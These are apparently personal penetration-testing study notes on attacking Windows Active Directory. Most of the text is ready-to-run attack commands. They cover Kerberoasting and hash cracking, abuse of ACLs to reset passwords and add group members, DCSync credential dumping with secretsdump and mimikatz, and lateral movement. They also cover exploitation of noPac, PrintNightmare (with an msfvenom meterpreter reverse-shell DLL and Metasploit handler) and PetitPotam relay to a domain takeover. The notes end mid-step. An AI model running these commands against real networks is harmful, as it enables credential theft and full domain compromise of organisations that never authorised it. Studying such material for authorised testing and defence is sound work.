Finding SPNs with highly privileged accounts in Windows environments is very common. However, the ticket (TGS-REP) is encrypted with NTLM, so may need to bruteforci it. Service accounts are often configured with weak or reused password to simplify administration, and sometimes the password is the same as the username.

Depending on your position in a network, this attack can be performed in multiple ways:
- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using runas /netonly.

Several tools can be utilized to perform the attack:
- Impacket’s [GetUserSPNs.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.

Obtaining a TGS ticket via Kerberoasting does not guarantee you a set of valid credentials, and the ticket must still be cracked offline. Also, this NTLM are often harder to crack than other system hashes. And getting this ticket doesn't grant any high privileged account.

> A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Also, knowing which host is the Domain Controller.
{: .prompt-danger}

## From Linux 

Start gathering a list of SPNs in the domain. We can authenticate in the DC with a cleartext password, NT password hash or even a Kerberos ticket. With the following command a credential prompt will be generated. Here we will see all the SPNs:
```console
zero@pio$ GetUserSPNs.py -dc-ip <IP> <DOMAIN>.LOCAL/<USER>
```

We can now pull all TGS tickets for offline processing using the `-request` flag for all the SPNs:
```console
zero@pio$ GetUserSPNs.py -dc-ip <IP> <DOMAIN>.LOCAL/<USER> -request
```

We can also just request the TGS ticket from one account:
```console
zero@pio$ GetUserSPNs.py -dc-ip <IP> <DOMAIN>.LOCAL/<USER> -request-user <USER> -outputfile <OUTPUT FILE>
```

With this ticket in hand, we could attempt to crack the user's password offline using Hashcat. Use the flag `-outputfile` to have the hash more handy. Use the following syntax to crack it:
```console
zero@pio$ hashcat -m 13100 hash_file <WORDLIST>
```

If we crack it, we can test the password:
```console
zero@pio$ sudo crackmapexec smb <IP> -u <USER< -p <PASSWORD>
```

## From Windows 

### Semi Manual method

Before **Rubeus** stealing a Kerberos ticket was a complex process. First, enumerate with [setspn](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) binary:
```console
C:\zeropio> setspn.exe -Q */*
```

To request with a single user:
```console
PS C:\zeropio> Add-Type -AssemblyName System.IdentityModel
PS C:\zeropio> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<DOMAIN>/<USER>"
```

The flow of the command was:
- The `Add-Type` cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
- The `-AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using
- `System.IdentityModel` is a namespace that contains different classes for building security token services
- We'll then use the `New-Object` cmdlet to create an instance of a .NET Framework object
- We'll use the `System.IdentityModel.Tokens` namespace with the `KerberosRequestorSecurityToken` class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session

We can also choose to retrieve all tickets using the same method:
```console
PS C:\zeropio> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

> This will also pull all computer accounts, so it is not optimal.
{: .prompt-alert}

Now we can use **mimikatz**:
```console
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```

We need to specify `base64 /out:true` or mimikatz will extract the tickets and write them to **.kirbi** files. Now we can take base64 blolb and remove new lines and white spaces:
```console
zero@pio$ echo "<base64 blob>" |  tr -d \\n
```

We  can place the above single line of output into a file and convert it back to a .kirbi file using the base64 utility:
```console
zero@pio$ cat encoded_file | base64 -d > ticket.kirbi
```

Next, we can use this version of the [kirbi2john.py](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) tool to extract the Kerberos ticket from the TGS file:
```console
zero@pio$ python2.7 kirbi2john ticket.kirbi
```

This will create a file called **crack_file**. We must modify the file to be able to use hashcat:
```console
zero@pio$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > tgs_hashcat
```

Now we can crack it with hashcat:
```console
zero@pio$ hashcat -m 13100 tgs_hashcat <WORDLIST>
```

If we decide to skip the base64 output with Mimikatz and type `mimikatz # kerberos::list /export`, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run kirbi2john.py against them directly, skipping the base64 decoding step.

### Tool Based Route 

First, use PowerView to extract the TGS tickets:
```console
PS C:\zeropio> Import-Module .\PowerView.ps1
PS C:\zeropio> Get-DomainUser * -spn | select samaccountname
```

Target a specific user:
```console
PS C:\htb> Get-DomainUser -Identity <USER> | Get-DomainSPNTicket -Format Hashcat
```

Export all tickets to CSV:
```console
PS C:\zeropio> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\<USER>_tgs.csv -NoTypeInformation
```

We can also use [Rubeus](https://github.com/GhostPack/Rubeus) from GhostPack to perform Kerberoasting even faster and easier.:
```console
PS C:\zeropio> .\Rubeus.exe
```

Rubeus include:
- Performing Kerberoasting and outputting hashes to a file
- Using alternate credentials
- Performing Kerberoasting combined with a pass-the-ticket attack
- Performing "opsec" Kerberoasting to filter out AES-enabled accounts
- Requesting tickets for accounts passwords set between a specific date range
- Placing a limit on the number of tickets requested
- Performing AES Kerberoasting

We can use Rubeus to gather some stats:
```console
PS C:\zeropio> .\Rubeus.exe kerberoast /stats
```

We can use Rubeus to request tickets for accounts with the **admincount** attribute set to **1**. Specify the `/nowrap` flag so the hash can be easily copied:
```console
PS C:\zeropio> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

### Encryption Types 

Kerberoasting tools typically request **RC4 encryption** when performing the attack and initiating TGS-REQ requests. RC4 is weakier and easier to crack offline, than other encryption algorithms like AES-128 or AES-256. Kerberoasting will usually retrieve hashes that begins with **$krb5tgs$23$**, and RC4 (type 23) ecnrypted ticket. It is possible to crack AES-128 (type 17) and AES-256 (type 18) but it will be time consuming.

Let's see an example. Getting the following ticket:
```console
PS C:\zeropio> .\Rubeus.exe kerberoast /user:test1 /nowrap

...
[*] Hash                   : $krb5tgs$23$*test1...
```

We can see it's type 23. We can check the **msDS-SupportedEncryptionTypes**. If it is set at **0** means the encryption is not defined and set default as **RC4_HMAC_MD5**:
```console
PS C:\zeropio> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

serviceprincipalname                   msds-supportedencryptiontypes samaccountname
--------------------                   ----------------------------- --------------
test1/kerberoast.inlanefreight.local                            0 testspn
```

If it is set to **24** it's mean that AES 128/256 encryption are the only ones supported. If we found the type **18** we will need to use hashcat mode 19700:
```console
zero@pio$ hashcat -m 19700 hash <WORDLIST>
```

---

# Access Control List (ACL) Abuse Primer 

ACLs are lists that define who has access to which asset/resource and the level of access they are provisioned. The settings are called **Access Control Entities** (**ACEs**). Each ACE maps back to an object of the AD. There are two types:
- **Discretionary Access Control List** (**DACL**): defines which security principals are granted or denied access to an object
- **System Access Control Lists** (**SACL**): allow administrators to log access attempts made to secured objects

There are three main types of ACEs:
- **Access denied ACE**: used within a DACL to show that a user or group is explicitly denied access to an object
- **Access allowed ACE**: used within a DACL to show that a user or group is explicitly granted access to an object
- **System audit ACE**: used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred

Each ACE is made up of the following four components:
1. SID of the user/group that has access to the object
2. flag denoting the type of ACE
3. flags that specify if the child containers/objects can inherit the given ACE from the primary or parent object
4. access mask (32 bit value) that defines the rights granted to an object 

Attackers utilize ACE entries to either further access or establish persistence. Many Organizations are unawared of these ACEs applied to each object. They cannot be detected by vulnerability scanning tools, so often can pass without being notice. ACL abuse can be a great way to move laterally/vertically. Some examples of Active Directory object security permissions are:
- **ForceChangePassword** abused with **Set-DomainUserPassword**
- **Add Members abused with Add-DomainGroupMember**
- **GenericAll** abused with **Set-DomainUserPassword** or **Add-DomainGroupMember**
- **GenericWrite** abused with **Set-DomainObject**
- **WriteOwner** abused with **Set-DomainObjectOwner**
- **WriteDACL** abused with **Add-DomainObjectACL**
- **AllExtendedRights** abused with **Set-DomainUserPassword** or **Add-DomainGroupMember**
- **Addself** abused with **Add-DomainGroupMember**

![ACL Attack Overview](/assets/img/notes/system/ACL_attacks_graphic.png)

We can use ACL attacks for:
- Lateral movement
- Privilege escalation
- Persistence

Some common scenarios are:

| **Attack**   | **Description**    |
|--------------- | --------------- |
| *Abusing forgot password permissions* | Help Desk and other IT users are often granted permissions to perform password resets and other privileged tasks |
| *Abusing group membership management* | It's also common to see Help Desk and other staff that have the right to add/remove users from a given group |
| *Excessive user rights* | We also commonly see user, computer, and group objects with excessive rights that a client is likely unaware of |

> Some ACL attacks can be considered "destructive," such as changing a user's password or performing other modifications within a client's AD domain.
{: .prompt-danger}

## Enumeration 

### PowerView

We can use PowerView to enumerate ACLs. Running the following function will give us a massive amount of information:
```console
PS C:\zeropio> Find-InterestingDomainAcl
```

This amount of data is time-consuming, so we will need a different approach to it. With PowerView, we can try the following with a user we have credentials:
```console
PS C:\zeropio> Import-Module .\PowerView.ps1
PS C:\zeropio> $sid = Convert-NameToSid <USER>
```

We can now use `Get-DomainObjectACL` to search:
```console
PS C:\zeropio> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

Search now the `ObjectAceType` output on the Internet to understand which ACE are we facing. PowerView can also be used:
```console
PS C:\zeropio> $guid= "<GUID>"
PS C:\zeropio> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
```

We can directly set the PowerView to tell us which ACE is with the flag `-ResolveGUIDs`:
```console
PS C:\zeropio> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```

Let's make now a list of all domain users:
```console
PS C:\zeropio> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```

Now, for each user, we will retrieve the ACL information. Then selecth the **Access property**. Finally, the `IdentityReference` to the user we are in control:
```console
PS C:\zeropio> foreach($line in [System.IO.File]::ReadLines("<PATH TO>\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match '<DOMAIN>\\<USER>'}}
```

Then follow the previous process to convert the GUID in human-readable format. The output of this command will be users that we may have control over them. Let's use PowerView to see which permissions has the next target, that we get in the previous command:
```console
PS C:\zeropio> $sid2 = Convert-NameToSid <NEXT USER>
PS C:\zeropio> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
```

Maybe we see here something of interes we may want to analyze digger:
```console
PS C:\zeropio> Get-DomainGroup -Identity "<GROUP OF THE TARGET>" | select memberof
```

We can now check that group:
```console
PS C:\zeropio> $itgroupsid = Convert-NameToSid "<GROUP>"
PS C:\zeropio> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
```

Keep searching the objects we will be finding. This can lead to a user takeover, a group takeover and others users takeover. With other privileges and permissions to sites we don't have access.

### BloodHound 

In BloodHound GUI we can select our start user as our starting node, in the **Node Info** scroll down to **Outbound Control Rights**. We will see object we have directly control.

## ACL Abuse Tactics 

First, we must authenticate as the user we have and change the password of the user we have control of. Authentication:
```console
PS C:\zeropio> $SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
PS C:\zeropio> $Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $SecPassword)
```

Now create a **SecureString Object**, which will be the password for the other user:
```console
PS C:\zeropio> $Password = ConvertTo-SecureString '<NEW PASSWORD>' -AsPlainText -Force
```

Finally, we use the function **Set-DomainUserPassword** to change the password:
```console
PPS C:\zeropio> Import-Module .\PowerView.ps1
PS C:\zeropio> Set-DomainUserPassword -Identity <TARGET USER> -AccountPassword $Password -Credential $Cred -Verbose
```

> We can do this in a Linux host with a tool like **pth-net**, from [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit).
{: .prompt-tip}

Now authenticate in the user:
```console
PS C:\zeropio> $SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
PS C:\zeropio> $Cred2 = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<TARGET USER>', $SecPassword)
```

Now we can add that user to other groups:
```console
PS C:\zeropio> Get-ADGroup -Identity "<GROUP>" -Properties * | Select -ExpandProperty Members
PS C:\zeropio> Add-DomainGroupMember -Identity '<GROUP>' -Members '<TARGET USER>' -Credential $Cred2 -Verbose
PS C:\zeropio> Get-DomainGroupMember -Identity "<GROUP>" | Select MemberName
```

At this point, we should be able to leverage our new group membership to take control over other user. If we cannot change the password of the third user, we can try a Kerberoasting attack with the property **GenericAll**. Create a fake SPN:
```console
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

Now use Rubeus to perform the Kerberoasting:
```console
PS C:\zeropio> .\Rubeus.exe kerberoast /user:<THIRD TARGET> /nowrap
```

### Cleanup

If we want to cleanup this process we must:
1. Remove the fake SPN we created 
2. Remove the second user from the group we added him
3. Set the password for the second user back to its original value (if we know it) or have our client set it/alert the user

To remove the fake SPN:
```console
PS C:\zeropio> Set-DomainObject -Credential $Cred2 -Identity <THIRD USER> -Clear serviceprincipalname -Verbose
```

Next, we'll remove the user from the group:
```console
PS C:\zeropio> Remove-DomainGroupMember -Identity "<GROUP>" -Members '<USER>' -Credential $Cred2 -Verbose
```

## DCSync 

If we have access with a user with DCSync privileges we can steal AD password database, by the **Directory Replication Service Remote Protocol**. This allow us to mimic the DC and retrieve user NTLM password hashes. We need to request a DC to replicate passwords via the **DS-Replication-Get-Changes-All** extended right. Domain/Enterprise Admins and default domain administrators have this right by default. 

We can check if a user has this privilege:
```console
PS C:\zeropio> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```

We can confirm it with **Get-ObjectACL**:
```console
PS C:\zeropio> $sid= "<SID OF USER>"
PS C:\zeropio> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

With certain rights over the user (for example **WriteDacl**) we can even add this privilege. 

To extract all the hashes we can use **secretsdump.py**:
```console
zero@pio$ secretsdump.py -outputfile <OUTPUT FILE> -just-dc <DOMAIN>/<USER>@<DOMAIN CONTROLLER IP>
```

| **Flag**   | **Description**    |
|--------------- | --------------- |
| `-just-dc` | generate three files, NTLM hashes, Kerberos keys and cleartext passwords from NTDS with reversible encryption enabled |
| `-just-dc-ntlm` | only NTLM hashes |
| `-just-dc-user <USER>` | specific user |
| `-pwd-last-set` | see when each account's password was changed |
| `-history` | dump password history |
| `-user-status` | check and see if a user is disabled |

We can enumerate all the users with this reversible encryption:
```console
PS C:\zeropio> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

Or:
```console
PS C:\zeropio> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'}
```

This attack can be done with mimikatz as well:
```console
PS C:\zeropio> .\mimikatz.exe

mimikatz # lsadump::dcsync /domain:<DOMAIN>.LOCAL /user:<DOMAIN>\administrator
```

---

# Lateral And Vertical Movement

With foothold on the domain, now we need to move further vertically or laterally. If we don't have access to the admin we can try the following:
- **Remote Desktop Protocol** (**RDP**)
- [Powershell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2)
- **MSSQL Server**

BloodHound could help us with:
- [CanRDP](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp)
- [CanPSRemote](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote)
- [SQLAdmin](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)

### Remote Desktop 

Usually we will have RDP access with users we find. Sometimes we can't have access to some machines (like the DC), but we can access others to:
- Launch further attacks
- Be able to escalate privileges and obtain credentials for a higher privileged user
- Be able to pillage the host for sensitive data or credentials

With PowerView we can enumerate the members of the **Remote Desktop Users** group on a machine:
```console
PS C:\zeropio> Get-NetLocalGroupMember -ComputerName <COMPUTER NAME> -GroupName "Remote Desktop Users"
```

We can also check this in BloodHound in the **Node Info**, **Execution Rights**.

### WinRM

We can check this with **Get-NetLocalGroupMember** to the **Remote Management Users** group:
```console
PS C:\zeropio> Get-NetLocalGroupMember -ComputerName <COMPUTER NAME> -GroupName "Remote Management Users"
```

We can also utilize this custom Cypher query in BloodHound to hunt for users with this type of access:
```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

We can stablish a WinRM session from Windows:
```console
PS C:\zeropio> $password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
PS C:\zeropio> $cred = new-object System.Management.Automation.PSCredential ("<DOMAIN>\<USER>", $password)
PS C:\zeropio> Enter-PSSession -ComputerName <COMPUTER NAME> -Credential $cred
```

From Linux we can use [evil-winrm](https://github.com/Hackplayers/evil-winrm):
```console
zero@pio$ evil-winrm -i <IP> -u <USER>
```

### SQL Server Admin 

Often we will find SQL Server. The tool [Snaffler](https://github.com/SnaffCon/Snaffler) can help us finding credentials for this. Also, with BloodHound we can check for **SQL Admin Rights** in the **Node Info** or with this query:
```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

With the previous attacks (ACL) and the [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) (check this [cheatsheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)) we can authenticate:
```console
PS C:\zeropio>  Import-Module .\PowerUpSQL.ps1
PS C:\zeropio>  Get-SQLInstanceDomain
PS C:\zeropio>  Get-SQLQuery -Verbose -Instance "<IP>,<PORT>" -username "<DOMAIN LOWERCASE>\<USER>" -password "<PASSWORD>" -query 'Select @@version'
```

Or use the [mssqlclient.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/mssqlclient.py) from Linux:
```console
zero@pio$ mssqlclient.py <DOMAIN>/<USER>@<IP> -windows-auth
```

Once connected we can type `help` to see the aviable commands. For example, we can enabled commands:
```console
SQL > enable_xp_cmdshell
SQL > xp_cmdshell whoami /priv
```

## Kerberos "Double Hop" 

There is a issue known as *Double Hop* that occurs when hops between two or more hosts. Often occurs when using WinRM or Powershell since the default authentication only provides a ticket. This will cause issues when performing lateral movement. When using WinRM to authenticate to two or more connections the user's password is never cached. When we use Kerberos we are not using a password for authentication. When a password is used, the NTLM hash is stored in the session. 

If we authenticate to a remote host via WinRM and use mimikatz as **backupadm** we won't see any credentials in memory for other users.
```console
PS C:\htb> PS C:\Users\ben.INLANEFREIGHT> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm
[DEV01]: PS C:\Users\backupadm\Documents> cd 'C:\Users\Public\'
[DEV01]: PS C:\Users\Public> .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit 

mimikatz(commandline) # privilege::debug 
mimikatz(commandline) # sekurlsa::logonpasswords
```

There are process running under **backupadm** (like **wsmprovhost.exe**, which is the process that spawns a Windows Remote Powershell):
```console
[DEV01]: PS C:\Users\Public> tasklist /V |findstr backupadm
```

Take the following example. We are hoping from our host to **DEV01** with **evil-winrm**, so our credentials are not stored in memory. We can use tools like PowerView, but Kerberos has no way of telling the DC that our user can access resources. This happen because the Kerberos TGT is not sent to the remote session. hen the user attempts to access subsequent resources in the domain, their TGT will not be present in the request.

If unconstrained delegation is enabled on a server, it is likely we won't face the *Double Hop* problem. We can try to overcome this issue:

### PSCredential Object 

We can connect to the remote host and set up a PSCredential object to pass our credentials. We try to import the PowerView, getting an error:
```console
*Evil-WinRM* PS C:\host1> Import-Module .\PowerView.ps1
```

If we check with `klist`, we see that we only have a cached Kerberos ticket for our current server:
```console
*Evil-WinRM* PS C:\zeropio> klist
```

Let's set up a PSCredential object. First, authentication:
```console
*Evil-WinRM* PS C:\zeropio> $SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

Now we can try to query the SPN accounts using PowerView:
```console
*Evil-WinRM* PS C:\zeropio> get-domainuser -spn -credential $Cred | select samaccountname
```

If we try again without specifying the `-credential` flag. If we RDP to the same host, open a CMD prompt, and type klist, we'll see that we have the necessary tickets cached to interact directly with the Domain Controller, and we don't need to worry about the double hop problem. 

### Register PSSession Configuration 

If we are on a domain-joined host and can connect to another using WinRM, or from a Windows attack host and connect to our target via WinRM using **Enter-PSSession** cmdlet, we need to do the following. First, stablish the WinRM session:
```console
PS C:\zeropio> Enter-PSSession -ComputerName <COMPUTER NAME> -Credential <DOMAIN>\backupadm
```

If we check for cached tickets using `klist`, we'll see that the same problem exists. We also cannot interact directly with the DC using PowerView. One trick we can use here is registering a new session configuration using the **Register-PSSessionConfiguration** cmdlet.
```console
PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential <DOMAIN>\backupadm
```

nce this is done, we need to restart the WinRM service by typing `Restart-Service WinRM` in our current PSSession. This works because our local machine will now impersonate the remote machine in the context of the **backupadm** user and all requests from our local machine will be sent directly to the Domain Controller.

> We cannot use `Register-PSSessionConfiguration` from an evil-winrm shell because we won't be able to get the credentials popup. Also, `RunAs` can only be used in a elevated PowerShell terminal.
{: .prompt-alert}

## Bleeding Edge Vulnerabilities 

### NoPac (SamAccountName Spoofing)

The [Sam\_The\_Admin vulnerability](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699), called as **noPac** or **SamAccountName Spoofing**. This vulnerability are contend in two CVEs: [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287). 

| **42278**   | **42287**    |
|--------------- | --------------- |
| bypass vulnerability with the SAM | vulnerability within the Kerberos PAC in ADDS |

This exploit consist in being able to change the **SamAccountName** of a computer account to that of a DC. Authenticated users can add up to tem compuerts to domain. When doing it, we change the name of the new host to macht the DC's SamAccountName. We must request a tickets to Kerberos, causing the service to issue a ticket under the DC?s name instead of the new name. We will have accesss as that service and provided with SYSTEM shell in the DC. [Here](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware) are a better explanation.

this [tool](https://github.com/Ridter/noPac) can be helpful while doing it. Be sure that Impacket is installed in order to work. Cloned the repo and use the **scanner.py** and **noPac.py** to gain the shell. If the scanner identifies the DC as vulnerable we will notice the **ms-DS-MachineAccountQuota** set to 10. IF it is set to 0 the attack won't success. This is a protection against some AD attacks.
```console
zero@pio$ sudo python3 scanner.py <DOMAIN>.local/<USER>:<PASSWORD> -dc-ip <DC IP> -use-ldap
```

This attack could be *noisy* and be blocked by AV or EDR:
```console
zero@pio$ sudo python3 noPac.py <DOMAIN>.LOCAL/<USER>:<PASSWORD> -dc-ip <DC IP>  -dc-host <HOST> -shell --impersonate administrator -use-ldap
```

Using [smbexec.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/smbexec.py) a semi-interactive shell will spawn. It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. We can use the ccache file to perform a *pass-the-ticket* attack, like DCSync. Also, the flag `-dump` will perform a DCSync using **secretsdump.py** (make sure to remove the ccache file created after):
```console
zero@pio$ sudo python3 noPac.py <DOMAIN>.LOCAL/<USER>:<PASSWORD> -dc-ip <DC IP>  -dc-host <DC HOST> --impersonate administrator -use-ldap -dump -just-dc-user <DOMAIN>/administrator
```

If Windows Defender (or another AV/EDR) is enabled, any command in the shell may fail. Using **smbexec.py** will create a service called **BTOBTO**, any command sent will go to **execute.bat**. With each new command, a new batch script will be created, executed and deleted.

## PrintNightmare

  **PrintNightmare** is the nickname to two CVE ([2021.34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)) found in the **Print Spooler service**. This allow RCE and PE. We will be using this [tool](https://github.com/cube0x0/CVE-2021-1675). We need the *cube0x0*'s version of Impacket:
```console
zero@pio$ git clone https://github.com/cube0x0/CVE-2021-1675.gi
zero@pio$ pip3 uninstall impacket
zero@pio$ git clone https://github.com/cube0x0/impacket 
zero@pio$ cd impacket; python3 ./setup.py install
```

We can use **rpcdump.py** to check if **Print System Asynchronous Protocol** and **Print System Remote Protocol**:
```console
zero@pio$ rpcdump.py @<IP> | egrep 'MS-RPRN|MS-PAR'
```

After confirming it, we can create a DDL payload:
```console
zero@pio$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=8080 -f dll > backupscript.dll
```

We will host this payload in a SMB share using **smbserver.py**:
```console
zero@pio$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

We can use MSF now to start a listener:
```console
msf > use exploit/multi/handler
msf > set PAYLOAD windows/x64/meterpreter/reverse_tcp 
msf > set LHOST 10.129.202.111 
msf > set LPORT 8080
msf > run
```

Now, run the exploit:
```console
zero@pio$ sudo python3 CVE-2021-1675.py <DOMAIN>.local/<USER>:<PASSWORD>@172.16.5.5 '\\<OUR IP>\CompData\backupscript.dll'
```

If everything works, we will have a SYSTEM shell.

### PetitPotam (MS-EFSRPC) 

PetitPotam ([CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)) is an LSA spoofing. An unauthenticated attacker can coarce the DC to authenticate against another host using NTLM over oort 445 via **Local Security Authority Remote Protocol** (**LSARPC**), by abusing Microsoft's **Encrypting FIle System Remote Protocol** (**MS-EFSRPC**). This allows an unauthenticated attacker to take over a Windows Domain where **Active Directory Certificate Services** (**AD CS**) are in use. This can be used with **Rubeus** or **gettgtpkinit.py** from [PKINITtools](https://github.com/dirkjanm/PKINITtools). [Here](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/) is explain in detail.

First, we need to start **ntlmrelayx.py**, specifying the **Web Enrollment URL** for the CA host, using KerberosAuthentication or DomainController AD CS template. We could use a tool like [certi](https://github.com/zer1t0/certi) to locate the cert.
```console
zero@pio$ sudo ntlmrelayx.py -debug -smb2support --target http://<DC COMPUTER NAME>.<DOMAIN>.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

While this is running, execute [PetitPotam.py](https://github.com/topotam/PetitPotam). There is an executable version for Windows host. ALso, mimikatz has this authentication trigger and can be use as `misc::efs /server:<DC> /connect:<ATTACK HOST>`. Also, here we have the [Invoke-PetitPotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1). Using the [EfsRpcOpenFileRaw](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8):
```console
zero@pio$ python3 PetitPotam.py <ATTACK HOST> <DC HOST>  
```

If we successfull execute it, we will see a login request, and obtain the base64 encoded certificate for the DC. With this certificate, we can use **gettgtgpkinit.py** to request a TGT for the DC:
```console
zero@pio$ python3 gettgtpkinit.py <DOMAIN>.LOCAL/<DC COMPUTER NAME>\$ -pfx-base64 <BASE64 CERT> dc01.ccache
```

The TGT request was saved in **dc01.ccache**. We can now use the **KRB5CCNAME** environment variable, so our attack host uses this file for Kerberos authentication attempt:
```console
zero@pio$ export KRB5CCNAME=dc01.ccache
```

We can use this TGT with **secretsdump.py** to perform a DCSync and retrieve the NTLM hashes:
```console
zero@pio$ secretsdump.py -just-dc-user <DOMAIN>/administrator -k -no-pass "<DC COMPUTER NAME>$"@<DC COMPUTER NAME>.<DOMAIN>.LOCAL
```

We could also use a more straightforward command: `secretsdump.py -just-dc-user <DOMAIN>/administrator -k -no-pass <DC COMPUTER NAME>.<DOMAIN>.LOCAL` because the tool will retrieve the username from the ccache file. We can use `klist` (installed from [krb5-user](https://packages.ubuntu.com/focal/krb5-user)) to check it.

We can now confirm the NTLM:
```console
zero@pio$ crackmapexec smb <DC IP> -u administrator -H <NTLM HASH>
```

We can also use the tool **getnthash.py** from PKINITtools to request the NT hash for our target host using Kerberos U2U to submit a TGS request with the **Privileged Attribute Certificate** (**PAC**), which contains the NT hash of the target. This can be decrypted with AS-REP encryption key.
```console
zero@pio$ python getnthash.py -key <NTLM HASH> <DOMAIN>.LOCAL/<DC COMPUTER NAME>$
```

We can use this hash to perform a DCSync:
```console
zero@pio$ secretsdump.py -just-dc-user <DOMAIN>/administrator "<COMPUTER NAME>$"@<DC IP> -hashes <HASH>
```

Alternatively, once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once:
```console
PS C:\zeropio> .\Rubeus.exe asktgt /user:<DC COMPUTER NAME>$ /certificate:<BASE64 CERT> /ptt
```

We can then type `klist` to confirm that the ticket is in memory:
